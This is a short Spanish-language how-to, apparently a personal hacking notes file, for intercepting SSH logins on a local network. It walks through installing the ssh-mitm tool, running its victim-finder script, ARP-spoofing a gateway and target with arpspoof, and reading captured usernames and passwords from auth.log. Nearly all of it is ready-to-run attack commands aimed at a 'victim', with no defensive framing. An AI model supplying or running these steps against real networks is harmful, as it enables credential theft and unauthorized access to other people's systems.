# Hacking SSH (Man-in-the Middle)

### Instalación

1. ```git clone https://github.com/jtesta/ssh-mitm.git```
2. En el directorio **ssh-mitm** ```./install.sh```

### Ejecución

1. Luego (con permisos de root y en el directorio donde clonamos el repositorio), ejecutamos: ```./start.sh```
2. ```python ./JoesAwesomeSSHMITMVictimFinder.py --interface eth0 --block-size 255```
3. En otra terminal colocamos el comando ```arpspoof -r -t 192.168.1.1 192.168.1.4```
4. Abrimos una tercera terminal y ejecutamos:  ```tail -f  /var/log/auth.log ```
5. Ahora, cuando la victima intente conectarse por **ssh**, podremos ver en los logs el usuario y contraseña:

<img src="https://media.discordapp.net/attachments/734581261833863212/769950376652570634/unknown.png" alt="https://media.discordapp.net/attachments/734581261833863212/769950376652570634/unknown.png" style="zoom:35%;" />

## Extras

* Para correr el archivo ```JoesAwesome...``` correr el siguiente comando: ```apt-get install python3-netaddr python3-netifaces```
* Para poder instalar (```./install.sh ``` ) necesitamos correr, ```export LANG=en_US.utf-8``` antes.
* Para poder usar ```arpspoof``` es necesario instalar ```apt-get install dsniff ```

## Referencias

* https://www.riccardoancarani.it/man-in-the-middle-ssh-yes-please/
* https://miloserdov.org/?p=3699